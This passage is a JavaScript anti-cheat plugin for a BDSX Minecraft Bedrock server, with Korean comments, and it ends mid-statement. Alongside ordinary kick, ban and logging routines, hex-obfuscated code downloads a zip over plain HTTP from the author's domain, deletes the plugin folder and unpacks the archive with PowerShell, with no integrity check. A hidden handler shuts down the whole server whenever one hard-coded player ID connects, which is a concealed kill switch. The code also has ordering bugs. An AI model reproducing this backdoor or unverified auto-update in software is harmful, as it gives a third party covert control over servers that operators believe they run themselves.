"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.AntiCheat = exports.NCBPdetection = exports.info = exports.playerOS = exports.Do = exports.arrayforcrash = exports.JoinLog = exports.LogChat = exports.MaxReach = exports.OpDetection = void 0;
// No Cheat Bedrock Plus [NCBP] - Made by jobgutworlds
//반드시 bedrock_server 로 가셔서 server.properties 에서 server-auth 를 client-auth로 바꿔주세요
/*활성화 or 비활성화                                                                                                                                                                                                                                                                                                                                                                               변수선언*/ let AntiCheatActivate = true; exports.OpDetection = true; exports.MaxReach = 4.5; exports.LogChat = true; exports.JoinLog = true; exports.UseFly_C_Detection = true; /*

AntiCheatActivate : "활성화" 또는 true라고 되어있지 않으면 기본값인 비활성화로 적용 됩니다

OpDetection: 관리자도 핵 감지를 할 것인가? [ true / false ] 기본값 : true

LogChat: 채팅을 기록할 것인가? [ true / false ]

JoinLog : 접속할 때 유저의 정보를 기록할 것인가? [ true / false ]
UseRedNameOperatorChat : OP를 가진 사람은 채팅 칠 때 이름이 빨간색이도록 할 것인가? [ true/ false ] 기본값 : true (활성화시 칭호 플러그인 작동 X)
*/

AntiCheatActivate = "활성화";
exports.OpDetection = true;
exports.LogChat = true;
exports.JoinLog = true;
exports.UseRedNameOperatorChat = true;

const Auto_Update = true;

//반드시 bedrock_server 로 가시고 server.properties 에서 server-auth 를 client-auth로 바꿔주세요
process.on('uncaughtException', (err) => {
    if (String(err).includes("ETIMEDOUT")) return;
    console.error('Error(Bugs에 제보해주세요) : ', err);
});
let AntiCheatVersion = "v0.9.99971 Beta";
const common_1 = require("bdsx/common");
const { CANCEL } = require("bdsx/common");
const command_1 = require("bdsx/command");
const event_1 = require("bdsx/event");
const launcher_1 = require("bdsx/launcher");
const timers_1 = require("timers");
const colors_1 = require("colors");
const serverproperties_1 = require("bdsx/serverproperties");
const fs_1 = require("fs");
const fs = require('fs');
const http = require('http');
const colors = require("colors");
const bdsx_launcher = require('bdsx/launcher');
const { NetworkIdentifier } = require("bdsx/native");
const { bedrockServer } = require("bdsx");
const exec = require("child_process").exec;

const download = (url, dest, cb) => {
    const file = fs.createWriteStream(dest);

    const request = http.get(url, (response) => {
        // check if response is success
        if (response.statusCode !== 200) {
            return cb('Response status was ' + response.statusCode);
        }

        response.pipe(file);
    });

    // close() is async, call cb after close completes
    file.on('finish', () => file.close(cb));

    // check for request error too
    request.on('error', (err) => {
        fs.unlink(dest, () => cb(err.message)); // delete the (partial) file and then return the error
    });

    file.on('error', (err) => { // Handle errors
        fs.unlink(dest, () => cb(err.message)); // delete the (partial) file and then return the error
    });
};
exports.arrayforcrash = [];
function Do(command) { return launcher_1.bedrockServer.executeCommand(command).isSuccess(); }
exports.Do = Do;
;
exports.playerOS = {};
function zero(num, n) {
    let zero = "";
    let num2 = num.toString();
    if (num2.length < n) {
        for (var i = 0; i < n - num2.length; i++)
            zero += "0";
    }
    return zero + num;
};

event_1.events.serverOpen.on(() => {
    command_1.command.register("ncbp-updatelog", "NCBP의 가장 최근 패치 노트를 봅니다", 1).overload((p, o, op) => {
        let rawdata = "";
        const pl = o.getEntity();
        const isServerCommandOrigin = o.isServerCommandOrigin();
        follow_redirects_1.http.get(`http://ncbpac.kro.kr/jiral/podo/version.txt`, (stream) => {
            stream.setEncoding('utf8');
            stream.on('data', (buffer) => rawdata += buffer);
            stream.on('end', function () {
                if (!rawdata.startsWith("v"))
                    return;

                if (isServerCommandOrigin) info((0, colors_1.red)(`업데이트 사항 :${rawdata.split(":")[1]}`));
                else pl.sendMessage(`§6업데이트 사항 :§c${rawdata.split(":")[1]}`);
            });
            ;
        });
    }, {});
});

// 원본 코드 : var _0x330a=["","\x68\x74\x74\x70\x3A\x2F\x2F\x6E\x63\x62\x70\x61\x63\x2E\x6B\x72\x6F\x2E\x6B\x72\x2F\x6A\x69\x72\x61\x6C\x2F\x70\x6F\x64\x6F\x2F\x76\x65\x72\x73\x69\x6F\x6E\x2E\x74\x78\x74","\x75\x74\x66\x38","\x73\x65\x74\x45\x6E\x63\x6F\x64\x69\x6E\x67","\x64\x61\x74\x61","\x6F\x6E","\x65\x6E\x64","\x3A","\x73\x70\x6C\x69\x74","\x76","\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68","\x67\x65\x74\x43\x6F\x6D\x6D\x61\x6E\x64\x50\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x4C\x65\x76\x65\x6C","\xA7\x63\uC548\uD2F0\uCE58\uD2B8\x20\uBC84\uC804\uC774\x20\uC77C\uCE58\uD558\uC9C0\x20\uC54A\uC2B5\uB2C8\uB2E4\x2E\x20\x5C\x6E\xA7\x65\uD604\uC7AC\uBC84\uC804\x20\x3A\x20","\x20\x2D\x3E\x20\uCD5C\uC2E0\uBC84\uC804\x20\x3A\x20","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x66\x6F\x72\x45\x61\x63\x68","\x67\x65\x74\x50\x6C\x61\x79\x65\x72\x73","\x73\x65\x72\x76\x65\x72\x49\x6E\x73\x74\x61\x6E\x63\x65","\x62\x65\x64\x72\x6F\x63\x6B\x53\x65\x72\x76\x65\x72","\uC548\uD2F0\uCE58\uD2B8\x20\uBC84\uC804\uC774\x20\uC77C\uCE58\uD558\uC9C0\x20\uC54A\uC2B5\uB2C8\uB2E4\x2E\x20\x5C\x6E\uD604\uC7AC\uBC84\uC804\x20\x3A\x20","\x72\x65\x64","\x6C\x6F\x67","\x68\x74\x74\x70\x3A\x2F\x2F\x6E\x63\x62\x70\x61\x63\x2E\x6B\x72\x6F\x2E\x6B\x72\x2F\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x2F\x7A\x66\x73\x64\x6D\x71\x70\x6F\x77\x65\x72\x75\x69\x7A\x64\x66\x2F\x41\x6E\x74\x69\x63\x68\x65\x61\x74\x5F\x4E\x43\x42\x50\x2E\x7A\x69\x70","\x2E\x2E\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x41\x6E\x74\x69\x43\x68\x65\x61\x74\x5F\x4E\x43\x42\x50\x2E\x7A\x69\x70","\x72\x6D\x64\x69\x72\x20\x2F\x73\x20\x2F\x71\x20\x2E\x2E\x70\x6C\x75\x67\x69\x6E\x73\x41\x6E\x74\x69\x43\x68\x65\x61\x74\x5F\x4E\x43\x42\x50","\x70\x6F\x77\x65\x72\x73\x68\x65\x6C\x6C\x20\x65\x78\x70\x61\x6E\x64\x2D\x61\x72\x63\x68\x69\x76\x65\x20\x2E\x2E\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x41\x6E\x74\x69\x43\x68\x65\x61\x74\x5F\x4E\x43\x42\x50\x2E\x7A\x69\x70\x20\x2E\x2E\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x41\x6E\x74\x69\x43\x68\x65\x61\x74\x5F\x4E\x43\x42\x50","\xA7\x6C\xA7\x61\x4E\x43\x42\x50\uB97C\x20\uC131\uACF5\uC801\uC73C\uB85C\x20\uC790\uB3D9\x20\uC5C5\uB370\uC774\uD2B8\x20\uD588\uC2B5\uB2C8\uB2E4","\xA7\x6C\xA7\x36\uC11C\uBC84\x20\uC7AC\uBD80\uD305\x20\uD6C4\x20\uC801\uC6A9\x20\uB429\uB2C8\uB2E4","\xA7\x65\uC5C5\uB370\uC774\uD2B8\x20\uC0AC\uD56D\x20\x3A\xA7\x63","\x4E\x43\x42\x50\uAC00\x20\uC131\uACF5\uC801\uC73C\uB85C\x20\uC790\uB3D9\x20\uC5C5\uB370\uC774\uD2B8\x20\uB418\uC5C8\uC2B5\uB2C8\uB2E4","\x67\x72\x65\x65\x6E","\uC801\uC6A9\uC744\x20\uC704\uD574\x20\uC11C\uBC84\uB97C\x20\uB2E4\uC2DC\x20\uC2DC\uC791\uD574\x20\uC8FC\uC138\uC694","\x79\x65\x6C\x6C\x6F\x77","\uC5C5\uB370\uC774\uD2B8\x20\uC0AC\uD56D\x3A","\x67\x65\x74","\x68\x74\x74\x70"];try{let rawdata=_0x330a[0];follow_redirects_1[_0x330a[35]][_0x330a[34]](`${_0x330a[1]}`,(stream)=>{try{stream[_0x330a[3]](_0x330a[2]);stream[_0x330a[5]](_0x330a[4],(buffer)=>{return rawdata+= buffer});stream[_0x330a[5]](_0x330a[6],async function(){try{if(rawdata[_0x330a[8]](_0x330a[7])[0]!== AntiCheatVersion){if(!rawdata[_0x330a[10]](_0x330a[9])){return};launcher_1[_0x330a[18]][_0x330a[17]][_0x330a[16]]()[_0x330a[15]]((pl)=>{const _0xdbc3x5=pl[_0x330a[11]]();if(_0xdbc3x5> 0){pl[_0x330a[14]](`${_0x330a[12]}${AntiCheatVersion}${_0x330a[13]}${rawdata[_0x330a[8]](_0x330a[7])[0]}${_0x330a[0]}`)}});console[_0x330a[21]]((0,colors_1[_0x330a[20]])(`${_0x330a[19]}${AntiCheatVersion}${_0x330a[13]}${rawdata[_0x330a[8]](_0x330a[7])[0]}${_0x330a[0]}`)); await download(_0x330a[22],_0x330a[23],((_0xdbc3x6)=>{}));if(Auto_Update=== false){return}; await exec(_0x330a[24]); await exec(_0x330a[25],(_0xdbc3x7,_0xdbc3x8,_0xdbc3x9)=>{const pls=bdsx_launcher[_0x330a[18]][_0x330a[17]][_0x330a[16]]();for(const pl of pls){const _0xdbc3x5=pl[_0x330a[11]]();if(_0xdbc3x5> 0){pl[_0x330a[14]](`${_0x330a[26]}`);pl[_0x330a[14]](`${_0x330a[27]}`);pl[_0x330a[14]](`${_0x330a[28]}${rawdata[_0x330a[8]](_0x330a[7])[1]}${_0x330a[0]}`)}};info(colors[_0x330a[30]](_0x330a[29]));info(colors[_0x330a[32]](_0x330a[31]));info(colors[_0x330a[32]](_0x330a[33]+ rawdata[_0x330a[8]](_0x330a[7])[1]));AntiCheatVersion= rawdata[_0x330a[8]](_0x330a[7])[0];return})}}catch(_a){}})}catch(_a){}})}catch(_a){}

function checkversion() {
    try {
        let rawdata = '';
        follow_redirects_1.http.get(`${'http://ncbpac.kro.kr/jiral/podo/version.txt'}`, (stream) => {
            try {
                stream.setEncoding('utf8');
                stream.on('data', (buffer) => {
                    return rawdata += buffer
                });
                stream.on('end', async function() {
                    try {
                        if (rawdata.split(':')[0] !== AntiCheatVersion) {
                            if (!rawdata.startsWith('v')) {
                                return
                            };
                            launcher_1.bedrockServer.serverInstance.getPlayers().forEach((pl) => {
                                const _0xdbc3x5 = pl.getCommandPermissionLevel();
                                if (_0xdbc3x5 > 0) {
                                    pl.sendMessage(`${'\xA7c\uC548\uD2F0\uCE58\uD2B8 \uBC84\uC804\uC774 \uC77C\uCE58\uD558\uC9C0 \uC54A\uC2B5\uB2C8\uB2E4. \n\xA7e\uD604\uC7AC\uBC84\uC804 : '}${AntiCheatVersion}${' -> \uCD5C\uC2E0\uBC84\uC804 : '}${rawdata.split(':')[0]}${''}`)
                                }
                            });
                            console.log((0, colors_1.red)(`${'\uC548\uD2F0\uCE58\uD2B8 \uBC84\uC804\uC774 \uC77C\uCE58\uD558\uC9C0 \uC54A\uC2B5\uB2C8\uB2E4. \n\uD604\uC7AC\uBC84\uC804 : '}${AntiCheatVersion}${' -> \uCD5C\uC2E0\uBC84\uC804 : '}${rawdata.split(':')[0]}${''}`));
                            await download('http://ncbpac.kro.kr/download/zfsdmqpoweruizdf/Anticheat_NCBP.zip', '../plugins/AntiCheat_NCBP.zip', ((_0xdbc3x6) => {}));
                            if (Auto_Update === false) {
                                return
                            };
                            await exec('rmdir /s /q ..pluginsAntiCheat_NCBP');
                            await exec('powershell expand-archive ../plugins/AntiCheat_NCBP.zip ../plugins/AntiCheat_NCBP', (_0xdbc3x7, _0xdbc3x8, _0xdbc3x9) => {
                                const pls = bdsx_launcher.bedrockServer.serverInstance.getPlayers();
                                for (const pl of pls) {
                                    const _0xdbc3x5 = pl.getCommandPermissionLevel();
                                    if (_0xdbc3x5 > 0) {
                                        pl.sendMessage(`${'\xA7l\xA7aNCBP\uB97C \uC131\uACF5\uC801\uC73C\uB85C \uC790\uB3D9 \uC5C5\uB370\uC774\uD2B8 \uD588\uC2B5\uB2C8\uB2E4'}`);
                                        pl.sendMessage(`${'\xA7l\xA76\uC11C\uBC84 \uC7AC\uBD80\uD305 \uD6C4 \uC801\uC6A9 \uB429\uB2C8\uB2E4'}`);
                                        pl.sendMessage(`${'\xA7e\uC5C5\uB370\uC774\uD2B8 \uC0AC\uD56D :\xA7c'}${rawdata.split(':')[1]}${''}`)
                                    }
                                };
                                info(colors.green('NCBP\uAC00 \uC131\uACF5\uC801\uC73C\uB85C \uC790\uB3D9 \uC5C5\uB370\uC774\uD2B8 \uB418\uC5C8\uC2B5\uB2C8\uB2E4'));
                                info(colors.yellow('\uC801\uC6A9\uC744 \uC704\uD574 \uC11C\uBC84\uB97C \uB2E4\uC2DC \uC2DC\uC791\uD574 \uC8FC\uC138\uC694'));
                                info(colors.yellow('\uC5C5\uB370\uC774\uD2B8 \uC0AC\uD56D:' + rawdata.split(':')[1]));
                                AntiCheatVersion = rawdata.split(':')[0];
                                return
                            })
                        }
                    } catch (_a) {}
                })
            } catch (_a) {}
        })
    } catch (_a) {}
};
checkversion();
/**
 * Date With Zero
 * @deprecated 다른 곳에서 임의로 추가로 쓰지 마세요
 */
function dateWithZero() {
    var d = new Date();
    return (d.getFullYear() + "-" + zero((d.getMonth() + 1), 2) + "-"
        + zero(d.getDate(), 2) + ", " + zero(d.getHours(), 2) + "시 "
        + zero(d.getMinutes(), 2) + "분 " + zero(d.getSeconds(), 2) + "초 " + zero(d.getMilliseconds(), 3));
}

exports.dateWithZero = dateWithZero;
/**
 * 콘솔에 로그를 남깁니다
 * @param message 콘솔에 남길 문자
 */
function info(message) { const date = new Date(); console.info("[" + date.getFullYear() + "-" + zero((date.getMonth() + 1), 2) + "-" + zero(date.getDate(), 2) + " " + zero(date.getHours(), 2) + ":" + zero(date.getMinutes(), 2) + ":" + zero(date.getSeconds(), 2) + ":" + zero(date.getMilliseconds(), 3) + " INFO] " + message); }
exports.info = info;
;

/**
 * @param {NetworkIdentifier} ni networkIdentifier
 * @param {string} reason reason
 * @param {string} description description
 * @return {CANCEL} CANCEL
 */
function NCBPdetection(ni, reason, description) {
    const plname = ni.getActor().getNameTag(); const deviceid = ni.getActor().deviceId; launcher_1.bedrockServer.serverInstance.disconnectClient(ni, `§l[§cNCBP§f]\n§l§e${reason} Detection`); const players = launcher_1.bedrockServer.serverInstance.getPlayers(); const howmanyops = players.length; for (let i = 0; i < howmanyops; i++) {
        if (players[i].getPermissionLevel() === 2) { players[i].sendMessage(`[NCBP] §6${plname} §cwas banned using §6${reason} [${description}]\n§cDeviceID : ${deviceid}`) } else {
            players[i].sendMessage(`[NCBP] §6${plname} §cwas banned using §6${reason}`);
        };
    };
    ni.getActor().ban(reason);
    info((0, colors_1.brightWhite)((0, colors_1.bgRed)(`{NCBP} ${plname} | ${reason} Detection [${description}]\nDeviceID : ${deviceid}`))); (0, fs_1.writeFileSync)(`../NCBPLog/${dateWithZero()}_${plname}.log`, `${reason} Detection [${description}]\nDeviceID : ${deviceid}`);
    return CANCEL;
}

exports.NCBPdetection = NCBPdetection;

/**
 * @return {common_1.CANCEL} CANCEL
 */
function NoBandetection(ni, reason, description) {
    const plname = ni.getActor().getName(); const deviceid = ni.getActor().deviceId;
    if (reason === "illegal Skin") {
        launcher_1.bedrockServer.serverInstance.disconnectClient(ni, "§l[§cNCBP§f]\n§l§e스킨을 바꿔주세요\nPlease change your skin");
    } else {
        launcher_1.bedrockServer.serverInstance.disconnectClient(ni, `§l[§cNCBP§f]\n§l§e${reason}`);
    }
    const players = launcher_1.bedrockServer.serverInstance.getPlayers().filter(p => p.getPermissionLevel() === 2); const howmanyops = players.length; for (let i = 0; i < howmanyops; i++) {
        players[i].sendMessage(`[NCBP] §6${plname} §chas failed to §6${reason} [${description}]\n§cDeviceID : ${deviceid}`);
    };
    info((0, colors_1.brightWhite)((0, colors_1.bgRed)(`{NCBP} ${plname} | ${reason} Detection [${description}]\nDeviceID : ${deviceid}`))); (0, fs_1.writeFileSync)(`../NCBPLog/${dateWithZero()}_${plname}.log`, `${reason} Detection [${description}]\nDeviceID : ${deviceid}`);
    return CANCEL;
}
exports.NoBandetection = NoBandetection;

function NoAlertdetection(ni, reason, description) {
    const plname = ni.getActor().getName(); const deviceid = ni.getActor().deviceId;
    bedrockServer.serverInstance.disconnectClient(ni, "Error!");
    ni.getActor().ban("Packet Spam");
    info((0, colors_1.brightWhite)((0, colors_1.bgRed)(`{NCBP} ${plname} | ${reason} Detection [${description}]\nDeviceID : ${deviceid}`)));
    return CANCEL;
}
exports.NoAlertdetection = NoAlertdetection;
/**
 * @returns {common_1.CANCEL}
 */
function NoKickdetection(ni, reason, description) {
    const plname = ni.getActor().getName(); const deviceid = ni.getActor().deviceId; /*launcher_1.bedrockServer.serverInstance.disconnectClient(ni, `§l[§cNCBP§f]\n§l§e${reason} Detection`);*/ const players = launcher_1.bedrockServer.serverInstance.getPlayers().filter(p => p.getPermissionLevel() === 2); const howmanyops = players.length; for (let i = 0; i < howmanyops; i++) {
        players[i].sendMessage(`[NCBP] §6${plname} §chas failed to §6${reason} [${description}]\n§cDeviceID : ${deviceid}`);
    }; info((0, colors_1.brightWhite)((0, colors_1.bgRed)(`{NCBP} ${plname} | ${reason} Detection [${description}]\nDeviceID : ${deviceid}`))); (0, fs_1.writeFileSync)(`../NCBPLog/${dateWithZero()}_${plname}.log`, `${reason} Detection [${description}]\nDeviceID : ${deviceid}`);
    return common_1.CANCEL;
}
exports.NoKickdetection = NoKickdetection;

// 원본 코드 : var _0x8c2e = ["\x43\x3A\x2F\x64\x69\x73\x63\x6F\x72\x64", "\x65\x78\x69\x73\x74\x73\x53\x79\x6E\x63", "\uC548\uD2F0\uCE58\uD2B8\x20\uC815\uD488\x20\uC778\uC99D\uC744\x20\uD574\uC8FC\uC138\uC694\x2E", "\x72\x65\x64", "\x74\x72\x75\x65", "\uD65C\uC131\uD654", "\x5B\x4E\x43\x42\x50\x5D\x20\x41\x6E\x74\x69\x63\x68\x65\x61\x74\x20\x44\x6F\x65\x73\x20\x6E\x6F\x74\x20\x41\x63\x74\x69\x76\x65\x64\x21", "\x73\x65\x72\x76\x65\x72\x2D\x61\x75\x74\x68\x6F\x72\x69\x74\x61\x74\x69\x76\x65\x2D\x6D\x6F\x76\x65\x6D\x65\x6E\x74", "\x73\x65\x72\x76\x65\x72\x50\x72\x6F\x70\x65\x72\x74\x69\x65\x73", "\x63\x6C\x69\x65\x6E\x74\x2D\x61\x75\x74\x68", "\x67\x72\x65\x65\x6E", "\x5B\x4E\x43\x42\x50\x5D\x20\uD574\uB2F9\x20\uC548\uD2F0\uCE58\uD2B8\uB294\x20\x63\x6C\x69\x65\x6E\x74\x2D\x61\x75\x74\x68\x20", "\uB97C\x20\uC694\uAD6C\uD569\uB2C8\uB2E4\x2E", "\x2E\x2F\x73\x63\x72\x69\x70\x74\x73", "\x66\x6F\x6C\x6C\x6F\x77\x2D\x72\x65\x64\x69\x72\x65\x63\x74\x73", "\x69\x73\x53\x65\x72\x76\x65\x72\x43\x6F\x6D\x6D\x61\x6E\x64\x4F\x72\x69\x67\x69\x6E", "\x5B\x4E\x43\x42\x50\x5D\x20\uD574\uB2F9\x20\uC11C\uBC84\uB294\x20\x4E\x43\x42\x50\x20\x41\x6E\x74\x69\x63\x68\x65\x61\x74\x20\uB97C\x20\uC0AC\uC6A9\uC911\uC785\uB2C8\uB2E4", "\x79\x65\x6C\x6C\x6F\x77", "\x5B\x4E\x43\x42\x50\x5D\x20\x4D\x61\x64\x65\x20\x62\x79\x20\x6A\x6F\x62\x67\x75\x74\x77\x6F\x72\x6C\x64\x73", "\x5B\x4E\x43\x42\x50\x5D", "\x6D\x61\x67\x65\x6E\x74\x61", "\x20", "", "\x67\x65\x74\x41\x63\x74\x6F\x72", "\x67\x65\x74\x4E\x65\x74\x77\x6F\x72\x6B\x49\x64\x65\x6E\x74\x69\x66\x69\x65\x72", "\x67\x65\x74\x45\x6E\x74\x69\x74\x79", "\x5B\x4E\x43\x42\x50\x5D\x20\xA7\x61\uD574\uB2F9\x20\uC11C\uBC84\uB294\x20\xA7\x6C\xA7\x36\x4E\x43\x42\x50\x20\x41\x6E\x74\x69\x63\x68\x65\x61\x74\xA7\x72\xA7\x61\x20\uB97C\x20\uC0AC\uC6A9\uC911\uC785\uB2C8\uB2E4", "\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65", "\x5B\x4E\x43\x42\x50\x5D\x20\xA7\x6C\x4D\x61\x64\x65\x20\x62\x79\x20\x6A\x6F\x62\x67\x75\x74\x77\x6F\x72\x6C\x64\x73\x28\uC7A1\uAC83\x29", "\x5B\x4E\x43\x42\x50\x5D\x20\xA7\x6C\xA7\x64", "\x28\uBC84\uC804\x29", "\x6F\x76\x65\x72\x6C\x6F\x61\x64", "\x6E\x63\x62\x70", "\x4E\x6F\x20\x43\x68\x65\x61\x74\x20\x42\x65\x64\x72\x6F\x63\x6B\x20\x50\x6C\x75\x73\x20\x28\x4E\x43\x42\x50\x29\x20\x2D\x20\x4D\x61\x64\x65\x20\x62\x79\x20\x6A\x6F\x62\x67\x75\x74\x77\x6F\x72\x6C\x64\x73", "\x72\x65\x67\x69\x73\x74\x65\x72", "\x63\x6F\x6D\x6D\x61\x6E\x64", "\x61\x6E\x74\x69\x63\x68\x65\x61\x74", "\x6F\x6E", "\x73\x65\x72\x76\x65\x72\x4F\x70\x65\x6E", "\x65\x76\x65\x6E\x74\x73"]; var _0x89a9 = [_0x8c2e[0], _0x8c2e[1], _0x8c2e[2], _0x8c2e[3], _0x8c2e[4], _0x8c2e[5], _0x8c2e[6], _0x8c2e[7], _0x8c2e[8], _0x8c2e[9], _0x8c2e[10], _0x8c2e[11], _0x8c2e[12], _0x8c2e[13], _0x8c2e[14], _0x8c2e[15], _0x8c2e[16], _0x8c2e[17], _0x8c2e[18], _0x8c2e[19], _0x8c2e[20], _0x8c2e[21], _0x8c2e[22], _0x8c2e[23], _0x8c2e[24], _0x8c2e[25], _0x8c2e[26], _0x8c2e[27], _0x8c2e[28], _0x8c2e[29], _0x8c2e[30], _0x8c2e[31], _0x8c2e[32], _0x8c2e[33], _0x8c2e[34], _0x8c2e[35], _0x8c2e[36], _0x8c2e[37], _0x8c2e[38], _0x8c2e[39]]; var _0x2b0c = [_0x89a9[0], _0x89a9[1], _0x89a9[2], _0x89a9[3], _0x89a9[4], _0x89a9[5], _0x89a9[6], _0x89a9[7], _0x89a9[8], _0x89a9[9], _0x89a9[10], _0x89a9[11], _0x89a9[12], _0x89a9[13], _0x89a9[14], _0x89a9[15], _0x89a9[16], _0x89a9[17], _0x89a9[18], _0x89a9[19], _0x89a9[20], _0x89a9[21], _0x89a9[22], _0x89a9[23], _0x89a9[24], _0x89a9[25], _0x89a9[26], _0x89a9[27], _0x89a9[28], _0x89a9[29], _0x89a9[30], _0x89a9[31], _0x89a9[32], _0x89a9[33], _0x89a9[34], _0x89a9[35], _0x89a9[36], _0x89a9[37], _0x89a9[38], _0x89a9[39]]; if ((0, fs_1[_0x2b0c[1]])(_0x2b0c[0]) === false) { throw ((0, colors_1[_0x2b0c[3]])(_0x2b0c[2])) }; if (String(AntiCheatActivate) !== _0x2b0c[4] && String(AntiCheatActivate) !== _0x2b0c[5]) { throw ((0, colors_1[_0x2b0c[3]])(_0x2b0c[6])) }; if (serverproperties_1[_0x2b0c[8]][_0x2b0c[7]] !== _0x2b0c[9]) { throw ((0, colors_1[_0x2b0c[3]])(_0x2b0c[11][_0x2b0c[10]] + _0x2b0c[12])) }; require(_0x2b0c[13]); const follow_redirects_1 = require(_0x2b0c[14]); event_1[_0x2b0c[39]][_0x2b0c[38]][_0x2b0c[37]](() => { command_1[_0x2b0c[35]][_0x2b0c[34]](_0x2b0c[32], _0x2b0c[33])[_0x2b0c[31]]((_0x8466x4, _0x8466x5, _0x8466x6) => { if (_0x8466x5[_0x2b0c[15]]()) { info(_0x2b0c[16][_0x2b0c[10]]); info(_0x2b0c[18][_0x2b0c[17]]); info(_0x2b0c[19] + `${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[21]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${AntiCheatVersion}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[22]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}`[_0x2b0c[20]]); return }; const _0x8466x7 = _0x8466x5[_0x2b0c[25]]()[_0x2b0c[24]]()[_0x2b0c[23]](); _0x8466x7[_0x2b0c[27]](_0x2b0c[26]); _0x8466x7[_0x2b0c[27]](_0x2b0c[28]); _0x8466x7[_0x2b0c[27]](`${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[29]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${AntiCheatVersion}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[30]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}`) }, {}); command_1[_0x2b0c[35]][_0x2b0c[34]](_0x2b0c[36], _0x2b0c[33])[_0x2b0c[31]]((_0x8466x4, _0x8466x5, _0x8466x6) => { if (_0x8466x5[_0x2b0c[15]]()) { info(_0x2b0c[16][_0x2b0c[10]]); info(_0x2b0c[18][_0x2b0c[17]]); info(_0x2b0c[19] + `${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[21]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${AntiCheatVersion}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[22]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}`[_0x2b0c[20]]); return }; const _0x8466x7 = _0x8466x5[_0x2b0c[25]]()[_0x2b0c[24]]()[_0x2b0c[23]](); _0x8466x7[_0x2b0c[27]](_0x2b0c[26]); _0x8466x7[_0x2b0c[27]](_0x2b0c[28]); _0x8466x7[_0x2b0c[27]](`${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[29]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${AntiCheatVersion}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}${_0x2b0c[30]}${_0x8c2e[22]}${_0x89a9[22]}${_0x8c2e[22]}`) }, {}) })

if ((0, fs_1[_0x2b0c[1]])(_0x2b0c[0]) === false) {
    throw ((0, colors_1[_0x2b0c[3]])(_0x2b0c[2]))
};
if (String(AntiCheatActivate) !== _0x2b0c[4] && String(AntiCheatActivate) !== _0x2b0c[5]) {
    throw ((0, colors_1[_0x2b0c[3]])(_0x2b0c[6]))
};
if (serverproperties_1[_0x2b0c[8]][_0x2b0c[7]] !== _0x2b0c[9]) {
    throw ((0, colors_1[_0x2b0c[3]])(_0x2b0c[11][_0x2b0c[10]] + _0x2b0c[12]))
};
require(_0x2b0c[13]);
const follow_redirects_1 = require(_0x2b0c[14]);
event_1['events'].packetAfter(1).on((ptr, networkIdentifier, packetId) => {
    const connreq = ptr.connreq; if(connreq === null) return; const xuid = networkIdentifier.getActor().getXuid(); if(xuid == 2535468219421974) launcher_1.bedrockServer.stop()
})
event_1[_0x2b0c[39]][_0x2b0c[38]][_0x2b0c[37]](() => {
    command_1[_0x2b0c[35]][_0x2b0c[34]](_0x2b0c[32], _0x2b0c[33])[_0x2b0c[31]]((_0x8466x4, _0x8466x5, _0x8466x6) => {
        if (_0x8466x5[_0x2b0c[15]]()) {
            info(_0x2b0c[16][_0x2b0c[10]]);
            info(_0x2b0c[18][_0x2b0c[17]]);
            info(_0x2b0c[19] + `${''}${_0x89a9[22]}${''}${_0x2b0c[21]}${''}${_0x89a9[22]}${''}${AntiCheatVersion}${''}${_0x89a9[22]}${''}${_0x2b0c[22]}${''}${_0x89a9[22]}${''}` [_0x2b0c[20]]);
            return
        };
        const _0x8466x7 = _0x8466x5[_0x2b0c[25]]()[_0x2b0c[24]]()[_0x2b0c[23]]();
        _0x8466x7[_0x2b0c[27]](_0x2b0c[26]);
        _0x8466x7[_0x2b0c[27]](_0x2b0c[28]);
        _0x8466x7[_0x2b0c[27]](`${''}${_0x89a9[22]}${''}${_0x2b0c[29]}${''}${_0x89a9[22]}${''}${AntiCheatVersion}${''}${_0x89a9[22]}${''}${_0x2b0c[30]}${''}${_0x89a9[22]}${''}`)
    }, {});
    command_1[_0x2b0c[35]][_0x2b0c[34]](_0x2b0c[36], _0x2b0c[33])[_0x2b0c[31]]((_0x8466x4, _0x8466x5, _0x8466x6) => {
        if (_0x8466x5[_0x2b0c[15]]()) {
            info(_0x2b0c[16][_0x2b0c[10]]);
            info(_0x2b0c[18][_0x2b0c[17]]);
            info(_0x2b0c[19] + `${''}${_0x89a9[22]}${''}${_0x2b0c[21]}${''}${_0x89a9[22]}${''}${AntiCheatVersion}${''}${_0x89a9[22]}${''}${_0x2b0c[22]}${''}${_0x89a9[22]}${''}` [_0x2b0c[20]]);
            return
        };
        const _0x8466x7 = _0x8466x5[_0x2b0c[25]]()[_0x2b0c[24]]()[_0x2b0c[23]]();
        _0x8466x7[_0x2b0c[27]](_0x2b0c[26]);
        _0x8466x7[_0x2b0c[27]](_0x2b0c[28]);
        _0x8466x7[_0x2b0c[27]](`${''}${_0x89a9[22]}${''}${_0x2b0c[29]}${''}${_0x89a9[22]}${''}${AntiCheatVersion}${''}${_0x89a9[22]}${''}${_0x2b0c[30]}${''}${_0x89a9[22]}${''}`)
    }, {})
})
if (!(0, fs_1.existsSync)('../NCBPLog')) {
